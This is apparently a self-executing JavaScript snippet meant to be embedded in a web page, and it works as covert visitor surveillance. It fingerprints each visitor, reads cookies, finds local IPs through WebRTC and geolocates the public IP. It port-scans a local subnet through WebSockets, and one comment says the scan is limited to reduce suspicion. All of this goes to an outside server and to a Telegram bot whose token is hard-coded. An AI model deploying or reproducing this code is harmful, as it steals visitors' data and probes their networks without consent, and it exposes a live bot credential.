(() => {
  // Expanded common ports list for advanced recon
  const commonPorts = [
    7,9,13,20,21,22,23,25,37,53,67,68,69,80,88,110,123,135,137,138,139,143,161,162,
    179,1900,2189,2190,2222,2302,2483,2484,3128,3306,3389,3689,3986,4000,4444,4500,
    4899,5000,5001,5060,5061,5190,5357,5432,5500,5631,5900,5985,6000,6667,6697,6881,
    7000,8080,8443,8888,9000,9090,10000,11371,12345,27374,28017,31337,50070,49152,49153,
    49154,49155,49156,49157,49158,49159,49160,49161,49162,49163,49164,49165,49166,49167,
    49168,49169,49170,49171,49172,49173,49174,49175,49176,49177,49178,49179,49180,49181,
    49182,49183,49184,49185,49186,49187,49188,49189,49190,49191,49192,49193,49194,49195,
    49196,49197,49198,49199,25565,27015,32400,50000
  ];

  // Helper delay function
  function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Generate UUIDv4 for unique visitor/device ID
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = (Math.random() * 16) | 0,
        v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  // Persistent visitor ID in localStorage
  const STORAGE_KEY = 'blitzd_unique_id';
  let uniqueId = localStorage.getItem(STORAGE_KEY);
  let isReturning = true;
  if (!uniqueId) {
    uniqueId = generateUUID();
    localStorage.setItem(STORAGE_KEY, uniqueId);
    isReturning = false;
  }

  // Collect browser and device data
  async function collectDeviceData() {
    const nav = navigator || {};
    const screen = window.screen || {};
    const battery = nav.getBattery ? await nav.getBattery() : null;
    const batteryLevel = battery ? Math.round(battery.level * 100) : null;

    // WebRTC local IP detection
    async function getLocalIPs() {
      return new Promise((resolve) => {
        const ips = new Set();
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .catch(() => resolve([]));
        pc.onicecandidate = (event) => {
          if (!event.candidate) {
            pc.close();
            resolve(Array.from(ips));
            return;
          }
          const parts = event.candidate.candidate.split(' ');
          const ip = parts[4];
          if (ip && !ips.has(ip)) {
            ips.add(ip);
          }
        };
      });
    }

    const localIPs = await getLocalIPs();

    // Cookies parsing
    function getCookies() {
      try {
        return document.cookie.split('; ').reduce((acc, cookieStr) => {
          const [key, val] = cookieStr.split('=');
          if (key && val) acc[key] = val;
          return acc;
        }, {});
      } catch {
        return {};
      }
    }

    // Browser plugins
    function getPlugins() {
      try {
        const plugins = [];
        for (let i = 0; i < (nav.plugins?.length || 0); i++) {
          plugins.push(nav.plugins[i].name);
        }
        return plugins;
      } catch {
        return [];
      }
    }

    // Language & timezone
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // Hardware concurrency
    const hardwareConcurrency = nav.hardwareConcurrency || null;

    // Touch support
    const maxTouchPoints = nav.maxTouchPoints || 0;

    // User agent
    const userAgent = nav.userAgent || '';

    // Platform
    const platform = nav.platform || '';

    // Languages
    const languages = nav.languages || [];

    // Screen resolution
    const screenRes = `${screen.width}x${screen.height}`;

    // Color depth
    const colorDepth = screen.colorDepth;

    // Cookie enabled
    const cookieEnabled = nav.cookieEnabled;

    // Online status
    const online = nav.onLine;

    return {
      uniqueId,
      isReturning,
      userAgent,
      platform,
      languages,
      timezone,
      hardwareConcurrency,
      maxTouchPoints,
      screenRes,
      colorDepth,
      cookieEnabled,
      online,
      batteryLevel,
      localIPs,
      cookies: getCookies(),
      plugins: getPlugins(),
      pageUrl: window.location.href,
      referrer: document.referrer,
      timestamp: new Date().toISOString()
    };
  }

  // Get public IP, ISP and geo info via ipapi.co
  async function getPublicIPInfo() {
    try {
      const resp = await fetch('https://ipapi.co/json/');
      if (!resp.ok) throw new Error('Failed to get IP info');
      return await resp.json();
    } catch {
      return null;
    }
  }

  // TCP Port scan on local subnet for specific port via WebSocket
  // Returns true if connection succeeded, false if failed/timed out
  // This technique is limited, works mostly on open WS ports and can trigger browser/network blocking
  function scanPort(ip, port, timeout = 3000) {
    return new Promise((resolve) => {
      let ws;
      let timer;
      let finished = false;

      function cleanup() {
        if (ws) {
          try { ws.close(); } catch {}
          ws = null;
        }
        if (timer) clearTimeout(timer);
      }

      try {
        ws = new WebSocket(`ws://${ip}:${port}`);
      } catch {
        resolve(false);
        return;
      }

      ws.onerror = () => {
        if (!finished) {
          finished = true;
          cleanup();
          resolve(false);
        }
      };

      ws.onopen = () => {
        if (!finished) {
          finished = true;
          cleanup();
          resolve(true);
        }
      };

      timer = setTimeout(() => {
        if (!finished) {
          finished = true;
          cleanup();
          resolve(false);
        }
      }, timeout);
    });
  }

  // Rate-limited scanning of 100.0.0.0/24 subnet on common ports
  async function scanLocalNetwork() {
    const subnetPrefix = '100.0.0.';
    const openPortsByIP = {};

    // Limit scan to first 10 IPs per session to reduce load & suspicion (adjustable)
    const ipsToScan = Array.from({ length: 10 }, (_, i) => subnetPrefix + (i + 1));

    for (const ip of ipsToScan) {
      for (const port of commonPorts) {
        const isOpen = await scanPort(ip, port, 2000);
        if (isOpen) {
          if (!openPortsByIP[ip]) openPortsByIP[ip] = [];
          openPortsByIP[ip].push(port);
        }
        // Rate limit 100ms between port scans
        await delay(100);
      }
      // Rate limit 500ms between IP scans
      await delay(500);
    }
    return openPortsByIP;
  }

  // Send JSON payload via HTTP POST
  async function sendPayloadHTTP(payload) {
    try {
      await fetch(`https://dev.gbya.co.uk:1880/osint`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        },
        body: JSON.stringify(payload)
      });
    } catch {}
  }

  // Send Telegram bot message using Telegram HTTP API
  async function sendTelegramMessage(payload) {
    try {
      const botToken = '5871224544:AAH2CkeLJSsmdmp4MIGIul8welqy6hLFVPU'; // <-- Replace with your bot token
      const chatId = '920222421'; // <-- Replace with your chat ID

      // Create a formatted table message from JSON data
      function createTable(data) {
        // Flatten simple keys for summary
        let msg = `<b>OSINT Report for ${data.uniqueId}</b>\n\n`;
        msg += `<b>Visitor Type:</b> ${data.isReturning ? 'Returning' : 'New'}\n`;
        msg += `<b>Timestamp:</b> ${data.timestamp}\n`;
        msg += `<b>Page URL:</b> ${data.pageUrl}\n`;
        msg += `<b>Referrer:</b> ${data.referrer || 'None'}\n\n`;

        msg += `<b>Public IP:</b> ${data.publicIP || 'N/A'}\n`;
        msg += `<b>Public IPv6:</b> ${data.publicIPv6 || 'N/A'}\n>`;
        msg += `<b>ISP:</b> ${data.isp || 'N/A'}\n`;
        msg += `<b>City:</b> ${data.city || 'N/A'}\n`;
        msg += `<b>Region:</b> ${data.region || 'N/A'}\n`;
        msg += `<b>Country:</b> ${data.country_name || 'N/A'}\n\n`;

        msg += `<b>User Agent:</b> ${data.userAgent}\n`;
        msg += `<b>Platform:</b> ${data.platform}\n`;
        msg += `<b>Languages:</b> ${data.languages.join(', ')}\n`;
        msg += `<b>Timezone:</b> ${data.timezone}\n`;
        msg += `<b>Hardware Concurrency:</b> ${data.hardwareConcurrency}\n`;
        msg += `<b>Touch Points:</b> ${data.maxTouchPoints}\n`;
        msg += `<b>Screen Resolution:</b> ${data.screenRes}\n`;
        msg += `<b>Color Depth:</b> ${data.colorDepth}\n`;
        msg += `<b>Cookie Enabled:</b> ${data.cookieEnabled}\n`;
        msg += `<b>Online:</b> ${data.online}\n`;
        msg += `<b>Battery Level:</b> ${data.batteryLevel !== null ? data.batteryLevel + '%' : 'N/A'}\n\n`;

        msg += `<b>Local IPs:</b> ${data.localIPs.join(', ') || 'None'}\n`;

        // Cookies summary
        const cookieKeys = Object.keys(data.cookies || {});
        msg += `<b>Cookies:</b> ${cookieKeys.length > 0 ? cookieKeys.join(', ') : 'None'}\n`;

        // Plugins summary
        msg += `<b>Plugins:</b> ${data.plugins.length > 0 ? data.plugins.join(', ') : 'None'}\n\n`;

        // Open Ports scan summary
        if (data.openPorts) {
          msg += `<b>Open Ports on Local Subnet:</b>\n`;
          for (const ip in data.openPorts) {
            msg += `- ${ip}: ${data.openPorts[ip].join(', ')}\n`;
          }
        } else {
          msg += `<b>Open Ports on Local Subnet:</b> None detected or scan skipped\n`;
        }
        return msg;
      }

      const message = createTable(payload);

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
    } catch {}
  }

  // Main async function to collect data, scan, and send
  (async () => {
    const deviceData = await collectDeviceData();
    const publicIPInfo = await getPublicIPInfo();

    // Merge public IP data
    if (publicIPInfo) {
      deviceData.publicIP = publicIPInfo.ip;
      deviceData.publicIPv6 = publicIPInfo.ipv6;
      deviceData.isp = publicIPInfo.org;
      deviceData.city = publicIPInfo.city;
      deviceData.region = publicIPInfo.region;
      deviceData.country_name = publicIPInfo.country_name;
    }

    // Only scan local network if on local/private IP range (optional)
    // For demo purposes, scanning is always run but can be conditioned on IP
    const openPorts = await scanLocalNetwork();
    deviceData.openPorts = openPorts;

    // Send data to server
    await sendPayloadHTTP(deviceData);

    // Send Telegram message
    await sendTelegramMessage(deviceData);
  })();
})();
